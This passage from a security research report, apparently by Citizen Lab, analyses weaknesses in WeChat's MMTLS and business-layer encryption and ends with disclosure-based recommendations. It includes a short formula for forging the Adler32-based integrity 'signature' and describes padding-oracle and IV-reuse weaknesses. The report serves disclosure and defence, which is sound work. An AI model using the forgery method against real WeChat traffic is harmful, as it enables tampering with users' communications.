<p>With the newly received server public key (<code>new_server_pub</code>), which is different from the <code>static_server_pub</code> hardcoded in the app, the client then derives a new secret (<code>new_secret</code>). new_secret is then used as the key to AES-GCM decrypt <code>authresponse_data</code>. The client can also verify <code>authresponse_data</code> with the given tag.</p>
<p><code>new_secret = <a href="https://github.com/openssl/openssl/blob/79c8dcf3985a7b75eac8e53eb8652728af6c5d3d/crypto/ec/ec_kmeth.c#L151" target="_blank" rel="noopener"><u>ECDH</u></a>(new_server_pub, client_privatekey)<br>
authresponse_data= AESGCM_decrypt(aad = hash(authrequest_data),<br>
new_secret, iv)<br>
</code></p>
<p><code>authresponse_data</code> is a serialized Protobuf containing a lot of important data for WeChat to start, starting with a helpful <strong>“</strong><code>Everything is ok</code><strong>”</strong> status message. A full sample of this Protobuf can be found in the <a href="https://github.com/citizenlab/wechat-security-report/blob/main/data/autoauth-response.json" target="_blank" rel="noopener"><u>Github repository</u></a>. Most importantly, <code>authresponse_data</code> contains <code><strong>session_key</strong></code>, which is the key used for future AES-CBC encryption under Symmetric Mode. From here on out, <code>new_secret</code> is only used in <code>genSignature()</code>, which is discussed below in Section 4C2 Integrity Check.</p>
<p>We measured the entropy of the session_key provided by the server, as it is used for future encryption. This key exclusively uses printable ASCII characters, and is thus limited to around ~100 bits of entropy.</p>
<p>The WeChat code refers to three different keys: <em>client_session</em>, <em>server_session</em>, and <em>single_session</em>. Generally, <em>client_session</em> refers to the <code>client_publickey</code>, <code>server_session</code> refers to the <em>shared secret key</em> generated using ECDH i.e. <code>new_secret</code>, and <code>single_session</code> refers to the <code>session_key</code> provided by the server.</p>
<h3 id="c.-business-layer-encryption-symmetric-mode">4C. Business-layer Encryption, Symmetric Mode</h3>
<p>After the client receives session_key from the server, future data is encrypted using Symmetric Mode. Symmetric Mode encryption is mostly done using AES-CBC instead of AES-GCM, with the exception of some large files being encrypted with <code>AesGcmEncryptWithCompress()</code>. As <code>AesGcmEncryptWithCompress()</code> requests are the exception, we focus on the more common use of AES-CBC.</p>
<p>Specifically, the Symmetric Mode uses AES-CBC with PKCS-7 padding, with the session_key as a symmetric key:</p>
<p><code>ciphertext = AES-CBC(PKCS7_pad(plaintext), session_key, iv = session_key)<br>
</code></p>
<p>This <code>session_key</code> is doubly used as the IV for encryption.</p>
<h4 id="c1.-integrity-check">4C1. Integrity check</h4>
<p>In Symmetric Mode, a function called <code>genSignature()</code> calculates a pseudo-integrity code on the plaintext. This function first calculates the <strong>MD5 hash</strong> of WeChat’s assigned user ID for the logged-in user (<code><span>uin</span></code>), <code><span>new_secret</span></code>, and the plaintext length. Then, genSignature() uses <a href="https://en.wikipedia.org/wiki/Adler-32" target="_blank" rel="noopener"><strong><u>Adler32</u></strong></a>, a checksumming function, on the MD5 hash concatenated with the plaintext.</p>
<div>
<pre>signature = adler32(md5(uin | new_secret | plaintext_len) |
            plaintext)
</pre>
</div>
<p>The result from Adler32 is concatenated to the ciphertext as metadata (see Section 3A for how it is included in the request and response headers), and is referred to as a <code>signature</code> in WeChat’s codebase. We note that though it is referred to as a <code>signature</code>, it does not provide any cryptographic properties; details can be found in the Security Issues section. The full pseudocode for this function can also be found in <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/reversing-notes.md#gensignature" target="_blank" rel="noopener"><u>the Github repository</u></a>.</p>
<h2 id="protobuf-data-payload">5. Protobuf data payload</h2>
<p>The input to Business-layer Encryption is generally a serialized Protobuf, optionally compressed with Zlib. When logged-in, many of the Protobufs sent to the server contain the following header data:</p>
<div>
<pre>"1": {
    "1": "\u0000",
    "2": "1111111111", # User ID (assigned by WeChat)
    "3": "AAAAAAAAAAAAAAA\u0000", # Device ID (assigned by WeChat)
    "4": "671094583", # Client Version
    "5": "android-34", # Android Version
    "6": "0"
    },
</pre>
</div>
<p>The Protobuf structure is defined in each API’s corresponding RR class, as we previously mentioned in the “Launching a WeChat network request” section.</p>
<h2 id="putting-it-all-together">6. Putting it all together</h2>
<p>In the below diagram, we demonstrate the network flow for the most common case of opening the WeChat application. We note that in order to prevent further complicating the diagram, HKDF derivations are not shown; for instance, when “🔑<code>mmtls</code>” is used, HKDF is used to derive a key from “🔑<code>mmtls</code>”, and the derived key is used for encryption. The specifics of how keys are derived, and which derived keys are used to encrypt which data, can be found in <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/outer-crypto.md#full-key-derivation-details" target="_blank" rel="noopener"><u>these notes</u></a>.</p>
<figure><p><a href="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1.png&amp;nocache=1"><img loading="lazy" decoding="async" src="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1.png&amp;nocache=1" alt="" width="914" height="1331" title="Should We Chat, Too? Security Analysis of WeChat’s MMTLS Encryption Protocol 5" srcset="https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1.png&amp;nocache=1 914w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-206x300.png&amp;nocache=1 206w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-703x1024.png&amp;nocache=1 703w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-768x1118.png&amp;nocache=1 768w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-233x340.png&amp;nocache=1 233w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-137x199.png&amp;nocache=1 137w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-190x277.png&amp;nocache=1 190w, https://citizenlab.ca/wp-content/webpc-passthru.php?src=https://citizenlab.ca/wp-content/uploads/2024/10/image1-180x262.png&amp;nocache=1 180w" sizes="(max-width: 914px) 100vw, 914px"></a></p><figcaption>Figure 3: Swimlane diagram demonstrating the encryption setup and network flow of the most common case (user is logged in, opens WeChat application).</figcaption></figure>
<p>We note that other configurations are possible. For instance, we have observed that if the Longlink MMTLS handshake completes first, the Business-layer “Logging-in” request and response can occur over the Longlink connection instead of over several <strong>shortlink</strong> connections. In addition, if the user is logged-out, Business-layer requests are simply encrypted with 🔑secret (resembling <strong>Shortlink 2</strong> requests)</p>
<h2 id="security-issues">Security issues</h2>
<p>In this section, we outline potential security issues and privacy weaknesses we identified with the construction of the <strong>MMTLS encryption</strong> and <strong>Business-layer</strong> encryption layers. There could be other issues as well.</p>
<h2 id="issues-with-mmtls-encryption">Issues with MMTLS encryption</h2>
<p>Below we detail the issues we found with WeChat’s MMTLS encryption.</p>
<h3 id="deterministic-iv">Deterministic IV</h3>
<p>The MMTLS encryption process generates a single IV once per connection. Then, they increment the IV for each subsequent record encrypted in that connection. Generally, NIST <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf" target="_blank" rel="noopener"><u>recommends</u></a> not using a wholly deterministic derivation for IVs in AES-GCM since it is easy to accidentally re-use IVs. In the case of AES-GCM, reuse of the (key, IV) tuple is catastrophic as it <a href="https://csrc.nist.gov/csrc/media/projects/block-cipher-techniques/documents/bcm/comments/800-38-series-drafts/gcm/joux_comments.pdf" target="_blank" rel="noopener"><u>allows key recovery</u></a> from the AES-GCM authentication tags. Since these tags are appended to AES-GCM ciphertexts for authentication, this enables plaintext recovery from as few as 2 ciphertexts encrypted with the same key and IV pair.</p>
<p>In addition, <a href="https://eprint.iacr.org/2016/564.pdf" target="_blank" rel="noopener"><u>Bellare and Tackmann</u></a> have shown that the use of a deterministic IV can make it possible for a powerful adversary to brute-force a particular (key, IV) combination. This type of attack applies to powerful adversaries, if the crypto system is deployed to a very large (i.e., the size of the Internet) pool of (key, IV) combinations being chosen. Since WeChat has over a billion users, this order of magnitude puts this attack within the realm of feasibility.</p>
<h3 id="lack-of-forward-secrecy">Lack of forward secrecy</h3>
<p>Forward secrecy is <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices" target="_blank" rel="noopener"><u>generally expected</u></a> of modern communications protocols to reduce the importance of session keys. Generally, TLS itself is forward-secret by design, except in the case of the first packet of a “resumed” session. This first packet is encrypted with a “pre-shared key”, or PSK established during a previous handshake.</p>
<p>MMTLS makes heavy use of PSKs by design. Since the Shortlink transport format only supports a single round-trip of communication (via a single HTTP POST request and response), any encrypted data sent via the transport format is encrypted with a pre-shared key. Since leaking the shared `PSK_ACCESS` secret would enable a third-party to decrypt any EarlyData sent across multiple MMTLS connections, data encrypted with the pre-shared key is not forward secret. The vast majority of records encrypted via MMTLS are sent via the Shortlink transport, which means that the majority of network data sent by WeChat is not forward-secret between connections. In addition, when opening the application, WeChat creates a single long-lived Longlink connection. This long-lived Longlink connection is open for the duration of the WeChat application, and any encrypted data that needs to be sent is sent over the same connection. Since most WeChat requests are either encrypted using (A) a session-resuming PSK or (B) the application data key of the long-lived Longlink connection, WeChat’s network traffic often does not retain forward-secrecy between network requests.</p>
<h2 id="issues-with-business-layer-encryption">Issues with Business-layer encryption</h2>
<p>On its own, the business-layer encryption construction, and, in particular the Symmetric Mode, AES-CBC construction, has many severe issues. Since the requests made by WeChat are double-encrypted, and these concerns only affect the inner, business layer of encryption, we did not find an immediate way to exploit them. However, in older versions of WeChat which exclusively used business-layer encryption, these issues would be exploitable.</p>
<h3 id="metadata-leak">Metadata leak</h3>
<p>Business-layer encryption does not encrypt metadata such as the user ID and request URI, as shown in the “Business-layer request” section. This issue is also <a href="https://cloud.tencent.com/developer/article/1005518" target="_blank" rel="noopener"><u>acknowledged</u></a> by the WeChat developers themselves to be one of the motivations to develop MMTLS encryption.</p>
<h3 id="forgeable-gensignature-integrity-check">Forgeable genSignature integrity check</h3>
<p>While the purpose of the <code>genSignature</code> code is not entirely clear, if it is being used for authentication (since the <code>ecdh_key</code> is included in the MD5) or integrity, it fails on both parts. A valid forgery can be calculated with any known <code>plaintext</code> without knowledge of the <code>ecdh_key</code>. If the client generates the following for some known plaintext message <code>plaintext</code>:</p>
<p><code>sig = adler32(md5(uin | ecdh_key | plaintext_len) | plaintext)</code></p>
<p>We can do the following to forge the signature <code>evil_sig</code> for some <code>evil_plaintext</code> with length <code>plaintext_len</code>:</p>
<p><code>evil_sig = sig - adler32(plaintext) + adler32(evil_plaintext)</code></p>
<p>Subtracting and adding from <code>adler32</code> checksums is achievable by solving for a system of equations <a href="https://en.wikipedia.org/wiki/Adler-32#Weakness" target="_blank" rel="noopener"><u>when the message is short</u></a>. Code for subtracting and adding to <code>adler32</code> checksum, thereby forging this integrity check, can be found in <code>adler.py</code> in <a href="https://github.com/citizenlab/wechat-security-report/blob/main/code/adler.py" target="_blank" rel="noopener"><u>our Github repository</u></a>.</p>
<h3 id="possible-aes-cbc-padding-oracle">Possible AES-CBC padding oracle</h3>
<p>Since AES-CBC is used alongside <a href="https://en.wikipedia.org/wiki/PKCS_7" target="_blank" rel="noopener"><u>PKCS7</u></a> padding, it is possible that the use of this encryption on its own would be susceptible to an <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noopener"><u>AES-CBC padding oracle</u></a>, which can lead to recovery of the encrypted plaintext. Earlier this year, we found that another custom cryptography scheme developed by a Tencent company was <a href="https://citizenlab.ca/2023/08/vulnerabilities-in-sogou-keyboard-encryption/"><u>susceptible to this exact attack</u></a>.</p>
<h3 id="key-iv-re-use-in-block-cipher-mode">Key, IV re-use in block cipher mode</h3>
<p>Re-using the key as the IV for AES-CBC, as well as re-using the same key for all encryption in a given session (i.e., the length of time that the user has the application opened) introduces some privacy issues for encrypted plaintexts. For instance, since the key and the IV provide all the randomness, re-using both means that if two plaintexts are identical, they will encrypt to the same ciphertext. In addition, due to the use of <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)" target="_blank" rel="noopener"><u>CBC mode</u></a> in particular, two plaintexts with identical N block-length prefixes will encrypt to the same first N ciphertext blocks.</p>
<h3 id="encryption-key-issues">Encryption key issues</h3>
<p>It is highly unconventional for the server to choose the encryption key used by the client. In fact, we note that the encryption key generated by the server (the “session key”) exclusively uses printable ASCII characters. Thus, even though the key is 128 bits long, the entropy of this key is at most 106 bits.</p>
<h3 id="no-forward-secrecy">No forward secrecy</h3>
<p>As mentioned in the previous section, forward-secrecy is a standard property for modern network communication encryption. When the user is logged-in, all communication with WeChat, at this encryption layer, is done with the exact same key. The client does not receive a new key until the user closes and restarts WeChat.</p>
<h2 id="other-versions-of-wechat">Other versions of WeChat</h2>
<p>To confirm our findings, we also tested our decryption code on WeChat 8.0.49 for Android (released April 2024) and found that the MMTLS network format matches that used by WeChat 8.0.49 for iOS.</p>
<h2 id="previous-versions-of-wechat-network-encryption">Previous versions of WeChat network encryption</h2>
<p>To understand how WeChat’s complex cryptosystems are tied together, we also briefly reverse-engineered an older version of WeChat that did not utilize MMTLS. The newest version of WeChat that did not utilize MMTLS was v6.3.16, released in 2016. Our full notes on this reverse-engineering can be found <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/wechat-v6.3.16.md" target="_blank" rel="noopener"><u>here</u></a>.</p>
<p>While logged-out, requests were largely using the Business-layer Encryption cryptosystem, using RSA public-key encryption rather than static Diffie-Hellman plus symmetric encryption via AES-GCM. We observed requests to the internal URIs <code>cgi-bin/micromsg-bin/encryptcheckresupdate</code> and <code>cgi-bin/micromsg-bin/getkvidkeystrategyrsa</code>.</p>
<p>There was also another encryption mode used, DES with a static key. This mode was used for sending crash logs and memory stacks; POST requests to the URI <code>/cgi-bin/mmsupport-bin/stackreport</code> were encrypted using DES.</p>
<p>We were not able to login to this version for dynamic analysis, but from our static analysis, we determined that the encryption behaves the same as Business-layer Encryption when logged-in (i.e. using a <code>session_key</code> provided by the server for AES-CBC encryption).</p>
<h2 id="discussion">Discussion</h2>
<h3 id="why-does-business-layer-encryption-matter">Why does Business-layer encryption matter?</h3>
<p>Since Business-layer encryption is wrapped in MMTLS, why should it matter whether or not it is secure? First, from our study of previous versions of WeChat, Business-layer encryption was the sole layer of encryption for WeChat network requests until 2016. Second, from the the fact that Business-layer encryption exposes internal request URI unencrypted, one of the possible architectures for WeChat would be to host different internal servers to handle different types of network requests (corresponding to different “requestType” values and different cgi-bin request URLs). It could be the case, for instance, that after MMTLS is terminated at the front WeChat servers (handles MMTLS decryption), the inner WeChat request that is forwarded to the corresponding internal WeChat server is not re-encrypted, and therefore solely encrypted using Business-layer encryption. A network eavesdropper, or network tap, placed within WeChat’s intranet could then attack the Business-layer encryption on these forwarded requests. However, this scenario is purely conjectural. <span>Tencent’s response to our disclosure is concerned with issues in Business-layer encryption and implies they are slowly migrating from the more problematic AES-CBC to AES-GCM, so Tencent is also concerned with this.</span></p>
<h3 id="why-not-use-tls">Why not use TLS?</h3>
<p>According to <a href="https://docs.google.com/document/d/14Gsqi3vWjXLhF3odeTjhq_njtTk4aFPr-LptPwuzMsw/edit" target="_blank" rel="noopener"><u>public documentation</u></a> and confirmed by our own findings, MMTLS (the “Outer layer” of encryption) is based heavily on TLS 1.3. In fact, the document demonstrates that the architects of MMTLS have a decent understanding of asymmetric cryptography in general.</p>
<p>The document contains reasoning for not using TLS. It explains that the way WeChat uses network requests necessitates something like <a href="https://www.haproxy.com/glossary/what-is-zero-round-trip-time-resumption-0-rtt" target="_blank" rel="noopener"><u>0-RTT</u></a> session resumption, because the majority of WeChat data transmission needs only one request-response cycle (i.e., Shortlink). MMTLS only required one round-trip handshake to establish the underlying TCP connection before any application data can be sent; according to this document, introducing another round-trip for the TLS 1.2 handshake was a non-starter.</p>
<blockquote><p>Fortunately, TLS1.3 proposes a 0-RTT (no additional network delay) method for the protocol handshake. In addition, the protocol itself provides extensibility through the version number, CipherSuite, and Extension mechanisms. However, TLS1.3 is still in draft phases, and its implementation may still be far away. TLS1.3 is also a general-purpose protocol for all apps, given the characteristics of WeChat, there is great room for optimization. Therefore, at the end, we chose to design and implement our own secure transport protocol, MMTLS, based on the TLS1.3 draft standard. [originally written in Chinese]</p></blockquote>
<p>However, even at the time of writing in 2016, TLS 1.2 did provide an option for <a href="https://blog.cloudflare.com/tls-session-resumption-full-speed-and-secure/" target="_blank" rel="noopener"><u>session resumption</u></a>. In addition, since WeChat controls both the servers and the clients, it doesn’t seem unreasonable to deploy the fully-fledged TLS 1.3 implementations that were being tested at the time, even if the IETF draft was incomplete.</p>
<p>Despite the architects of MMTLS’ best effort, generally, the security protocols used by WeChat seem both less performant and less secure than TLS 1.3. Generally speaking, designing a secure and performant transport protocol is no easy feat.</p>
<p>The issue of performing an extra round-trip for a handshake has been a perennial issue for application developers. The TCP and TLS handshake each require a single round-trip, meaning each new data packet sent requires two round-trips. Today, TLS-over-QUIC combines the transport-layer and encryption-layer handshakes, requiring only a single handshake. QUIC provides the best of both worlds, both strong, forward-secret encryption, and halving the number of round-trips needed for secure communication. <strong>Our recommendation would be for WeChat to migrate to a standard QUIC implementation.</strong></p>
<p>Finally, there is also the issue of client-side performance, in addition to network performance. Since WeChat’s encryption scheme performs two layers of encryption per request, the client is performing double the work to encrypt data, than if they used a single standardized cryptosystem.</p>
<h3 id="the-trend-of-home-rolled-cryptography-in-chinese-applications">The trend of home-rolled cryptography in Chinese applications</h3>
<p>The findings here contribute to much of <a href="https://citizenlab.ca/2024/04/vulnerabilities-across-keyboard-apps-reveal-keystrokes-to-network-eavesdroppers/"><u>our</u></a> <a href="https://citizenlab.ca/2016/03/privacy-security-issues-qq-browser/"><u>prior</u></a> <a href="https://citizenlab.ca/2015/05/a-chatty-squirrel-privacy-and-security-issues-with-uc-browser/"><u>research</u></a> that suggests the popularity of home-grown cryptography in Chinese applications. In general, the avoidance of TLS and the preference for proprietary and non-standard cryptography is a departure from cryptographic best practices. While there may have been many legitimate reasons to distrust TLS in 2011 (like <a href="https://www.usenix.org/legacy/events/sec11/tech/slides/eckersley.pdf" target="_blank" rel="noopener"><u>EFF</u></a> and <a href="https://www.accessnow.org/wp-content/uploads/archive/docs/Weakest_Link_in_the_Chain.pdf" target="_blank" rel="noopener"><u>Access Now</u></a>’s concerns over the certificate authority ecosystem), the TLS ecosystem has largely <a href="https://letsencrypt.org/stats/" target="_blank" rel="noopener"><u>stabilized</u></a> since then, and is more auditable and <a href="https://certificate.transparency.dev/" target="_blank" rel="noopener"><u>transparent</u></a>. Like MMTLS, all the proprietary protocols we have researched in the past contain weaknesses relative to TLS, and, in some cases, could even be <a href="https://citizenlab.ca/2024/04/vulnerabilities-across-keyboard-apps-reveal-keystrokes-to-network-eavesdroppers/"><u>trivially decrypted</u></a> by a network adversary. This is a growing, concerning trend unique to the Chinese security landscape as the global Internet progresses towards technologies like QUIC or TLS to protect data in transit.</p>
<h3 id="anti-dns-hijacking-mechanisms">Anti-DNS-hijacking mechanisms</h3>
<p>Similar to how Tencent wrote their own cryptographic system, we found that in Mars they also wrote a proprietary domain lookup system. This system is part of STN and has the ability to support domain name to IP address lookups over HTTP. This feature is referred to as “NewDNS” in Mars. Based on our dynamic analysis, this feature is regularly used in WeChat. At first glance, NewDNS duplicates the same functions already provided by DNS (Domain Name System), which is already built into nearly all internet-connected devices.</p>
<p>WeChat is not the only app in China that utilizes such a system. Major cloud computing providers in China such as <a href="https://cn.aliyun.com/product/httpdns?from_alibabacloud=" target="_blank" rel="noopener"><u>Alibaba Cloud</u></a> and <a href="https://cloud.tencent.com/developer/article/2180368" target="_blank" rel="noopener"><u>Tencent Cloud</u></a> both offer their own DNS over HTTP service. A VirusTotal search for apps that tries to contact <a href="https://github.com/TencentCloud/httpdns-sdk-android" target="_blank" rel="noopener"><u>Tencent Cloud’s DNS over HTTP service endpoint (119.29.29.98)</u></a> yielded <a href="https://www.virustotal.com/gui/search/behavior_network%253A%2522119.29.29.98%2522/files" target="_blank" rel="noopener"><u>3,865 unique results</u></a>.</p>
<p>One likely reason for adopting such a system is that ISPs in China often implement <a href="https://en.wikipedia.org/wiki/DNS_hijacking" target="_blank" rel="noopener"><u>DNS hijacking</u></a> to insert ads and redirect web traffic to perform <a href="https://www.oracle.com/uk/advertising/measurement/ad-fraud-invalid-traffic/" target="_blank" rel="noopener"><u>ad fraud</u></a>. The problem was so serious that six Chinese internet giants <a href="https://www.thepaper.cn/newsDetail_forward_1413110" target="_blank" rel="noopener"><u>issued a joint statement in 2015</u></a> urging ISPs to improve. According to the news article, about 1–2% of traffic to Meituan (an online shopping site) suffers from DNS hijacking. Ad fraud by Chinese ISPs seems to remain a <a href="https://web.archive.org/web/20240131063911/https://www.v2ex.com/t/651746" target="_blank" rel="noopener"><u>widespread</u></a> <a href="https://web.archive.org/web/20240131063930/https://m.thepaper.cn/baijiahao_15406173" target="_blank" rel="noopener"><u>problem</u></a> in recent years.</p>
<p>Similar to their MMTLS cryptographic system, Tencent’s NewDNS domain lookup system was motivated by trying to meet the needs of the Chinese networking environment. DNS proper over the years has proven to have multiple <a href="https://en.wikipedia.org/w/index.php?title=Domain_Name_System&amp;oldid=1232087380#Security_issues" target="_blank" rel="noopener"><u>security</u></a> and <a href="https://en.wikipedia.org/w/index.php?title=Domain_Name_System&amp;oldid=1232087380#Privacy_and_tracking_issues" target="_blank" rel="noopener"><u>privacy</u></a> issues. Compared to TLS, we found that WeChat’s MMTLS has additional deficiencies. However, it remains an open question as to, when compared to DNS proper, whether NewDNS is more or less problematic. We leave this question for future work.</p>
<h3 id="use-of-mars-stn-outside-wechat">Use of Mars STN outside WeChat</h3>
<p>We speculate that there is a widespread adoption of Mars (mars-open) outside of WeChat, based on the following observations:</p>
<ul>
<li>There are numerous <a href="https://github.com/Tencent/mars/issues" target="_blank" rel="noopener"><u>issues</u></a> opened on the Mars GitHub repository.</li>
<li>There are <a href="http://www.li5jun.com/article/662.html" target="_blank" rel="noopener"><u>plenty</u></a> <a href="https://blog.csdn.net/BunnyCoffer/article/details/80051766" target="_blank" rel="noopener"><u>of</u></a> technical <a href="https://segmentfault.com/a/1190000016558538" target="_blank" rel="noopener"><u>articles</u></a> outlining building instant messaging systems using Mars.</li>
<li>There is already <a href="https://docs.wildfirechat.cn/" target="_blank" rel="noopener"><u>a white-label instant messaging system product</u></a> that is based on Mars.</li>
</ul>
<p>The adoption of Mars outside of WeChat is concerning because Mars by default does not provide any transport encryption. As we have mentioned in the “Three Parts of Mars” section, the MMTLS encryption used in WeChat is part of mars-wechat, which <a href="https://github.com/Tencent/mars/issues/1023" target="_blank" rel="noopener"><u>is not open source</u></a>. The Mars developers <a href="https://github.com/Tencent/mars/issues/81" target="_blank" rel="noopener"><u>also have no plans to add support of TLS, and expect other developers using Mars to implement their own encryption in the upper layers</u></a>. To make matters worse, implementing TLS within Mars <a href="https://github.com/Tencent/mars/issues/184" target="_blank" rel="noopener"><u>seems to require a fair bit of architectural changes</u></a>. Even though it would not be unfair for Tencent to keep MMTLS proprietary, MMTLS is still the main encryption system that Mars was designed for, leaving MMTLS proprietary would mean other developers using Mars would have to either devote significant resources to integrate a different encryption system with Mars, or leave everything unencrypted.</p>
<p>Mars is also lacking in documentation. The official <a href="https://github.com/Tencent/mars/wiki/" target="_blank" rel="noopener"><u>wiki</u></a> only contains a few, old articles on how to integrate with Mars. Developers using Mars often resort to <a href="https://github.com/Tencent/mars/issues/639" target="_blank" rel="noopener"><u>asking questions on GitHub</u></a>. The lack of documentation means that developers are more prone to making mistakes, and ultimately reducing security.</p>
<p>Further research is needed in this area to analyze the security of apps that use Tencent’s Mars library.</p>
<h3 id="tinker-a-dynamic-code-loading-module">“Tinker”, a dynamic code-loading module</h3>
<p>In this section, we tentatively refer to the APK downloaded from the Google Play Store as “WeChat APK”, and the APK downloaded from WeChat’s official website as “Weixin APK”. The distinction between WeChat and Weixin seems blurry. The WeChat APK and Weixin APK contain partially different code, as we will later discuss in this section. However, when installing both of these APKs to an English-locale Android Emulator, they both show their app names as “WeChat”. Their application ID, which is used by the Android system and Google Play Store to identify apps, are also both “com.tencent.mm”. We were also able to login to our US-number accounts using both APKs.</p>
<p>Unlike the WeChat APK, we found that the Weixin APK contains Tinker, <a href="https://github.com/Tencent/tinker" target="_blank" rel="noopener"><u>“a hot-fix solution library”</u></a>. Tinker allows the developer to update the app itself without calling Android’s system APK installer by using a technique called “dynamic code loading”. In an earlier report we found a similar <a href="https://citizenlab.ca/2021/03/tiktok-vs-douyin-security-privacy-analysis/"><u>distinction</u></a> between TikTok and Douyin, where we found Douyin to have a similar dynamic code-loading feature that was not present in TikTok. This feature raises three concerns:</p>
<ol type="1">
<li>If the process for downloading and loading the dynamic code does not sufficiently authenticate the downloaded code (e.g., that it is cryptographically signed with the correct public key, that it is not out of date, and that it is the code intended to be downloaded and not other cryptographically signed and up-to-date code), an attacker might be able to exploit this process to run malicious code on the device (e.g., by injecting arbitrary code, by performing a downgrade attack, or by performing a sidegrade attack). Back in 2016, we found such instances in <a href="https://citizenlab.ca/2016/02/privacy-security-issues-baidu-browser/"><u>other</u></a> <a href="https://citizenlab.ca/2016/03/privacy-security-issues-qq-browser/"><u>Chinese</u></a> <a href="https://citizenlab.ca/2016/08/a-tough-nut-to-crack-look-privacy-and-security-issues-with-uc-browser/"><u>apps</u></a>.</li>
<li>Even if the code downloading and loading mechanism contains no weaknesses, the dynamic code loading feature still allows the application to load code without notifying the user, bypassing users’ consent to decide what program could run on their device. For example, the developer may push out an unwanted update, and the users do not have a choice to keep using the old version. Furthermore, a developer may selectively target a user with an update that compromises their security or privacy. In 2016, a Chinese security analyst <a href="https://web.archive.org/web/20160330060941/news.boxun.com/news/gb/china/2016/02/201602231542.shtml" target="_blank" rel="noopener"><u>accused</u></a> Alibaba of pushing dynamically loaded code to Alipay to surreptitiously take photos and record audio on his device.</li>
<li>Dynamically loading code deprives app store reviewers from reviewing all relevant behavior of an app’s execution. As such, the <a href="https://support.google.com/googleplay/android-developer/answer/14906471?hl=en" target="_blank" rel="noopener"><u>Google Play Developer Program Policy</u></a> does not permit apps to use dynamic code loading.</li>
</ol>
<p>When analyzing the WeChat APK, we found that, while it retains some components of Tinker. The component which seems to handle the downloading of app updates is present, however the core part of Tinker that handles loading and executing the downloaded app updates has been replaced with “no-op” functions, which perform no actions. We did not analyze the WeChat binaries available from other third party app stores.</p>
<p>Further research is needed to analyze the security of Tinker’s app update process, whether WeChat APKs from other sources contain the dynamic code loading feature, as well as any further differences between the WeChat APK and Weixin APK.</p>
<h2 id="recommendations">Recommendations</h2>
<p>In this section, we make recommendations based on our findings to relevant audiences.</p>
<h3 id="to-application-developers">To application developers</h3>
<p>Implementing proprietary encryption is more expensive, less performant, and <a href="https://www.schneier.com/blog/archives/2011/04/schneiers_law.html" target="_blank" rel="noopener"><u>less secure</u></a> than using well-scrutinized standard encryption suites. Given the sensitive nature of data that can be sent by applications, we encourage application developers to use tried-and-true encryption suites and protocols and to avoid rolling their own crypto. SSL/TLS has seen almost three decades of various improvements as a result of rigorous public and academic scrutiny. TLS configuration is now easier than ever before, and the advent of QUIC-based TLS has dramatically improved performance.</p>
<h3 id="to-tencent-and-wechat-developers">To Tencent and WeChat developers</h3>
<p>Below is a copy of the recommendations we sent to WeChat and Tencent in our disclosure. The full disclosure correspondence can be found in the <a href="#appendix">Appendix</a>.</p>
<blockquote><p>In <a href="https://github.com/WeMobileDev/article/blob/master/%E5%9F%BA%E4%BA%8ETLS1.3%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AEmmtls%E4%BB%8B%E7%BB%8D.md" target="_blank" rel="noopener"><u>this post from 2016</u></a>, WeChat developers note that they wished to upgrade their encryption, but the addition of another round-trip for the TLS 1.2 handshake would significantly degrade WeChat network performance, as the application relies on many short bursts of communication. At that time, TLS 1.3 was not yet an RFC (though session resumption extensions were available for TLS 1.2), so they opted to “roll their own” and incorporate TLS 1.3’s session resumption model into MMTLS.</p>
<p>This issue of performing an extra round-trip for a handshake has been a perennial issue for application developers around the world. The TCP and TLS handshake each require a single round-trip, meaning each new data packet sent requires two round-trips. Today, TLS-over-QUIC combines the transport-layer and encryption-layer handshakes, requiring only a single handshake. QUIC was developed for this express purpose, and can provide both strong, forward-secret encryption, while halving the number of round-trips needed for secure communication. We also note that WeChat seems to already use QUIC for some large file downloads. <strong>Our recommendation would be for WeChat to migrate entirely to a standard TLS or QUIC+TLS implementation.</strong></p>
<p>There is also the issue of client-side performance, in addition to network performance. Since WeChat’s encryption scheme performs two layers of encryption per request, the client is performing double the work to encrypt data than if WeChat used a single standardized cryptosystem.</p></blockquote>
<h3 id="to-operating-systems">To operating systems</h3>
<p>On the web, client-side browser <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" target="_blank" rel="noopener"><u>security</u></a> <a href="https://blog.mozilla.org/security/2017/01/20/communicating-the-dangers-of-non-secure-http/" target="_blank" rel="noopener"><u>warnings</u></a> and the use of HTTPS as <a href="https://developers.google.com/search/blog/2014/08/https-as-ranking-signal" target="_blank" rel="noopener"><u>a ranking factor</u></a> in search engines contributed to widespread TLS adoption. We can draw loose analogies to the mobile ecosystem’s operating systems and application stores.</p>
<p>Is there any platform or OS-level permission model that can indicate regular usage of standard encrypted network communications? As we mentioned in our prior work studying proprietary cryptography in <a href="https://citizenlab.ca/2024/04/vulnerabilities-across-keyboard-apps-reveal-keystrokes-to-network-eavesdroppers/"><u>Chinese IME keyboards</u></a>, OS developers could consider device permission models that surface whether applications use lower-level system calls for network access.</p>
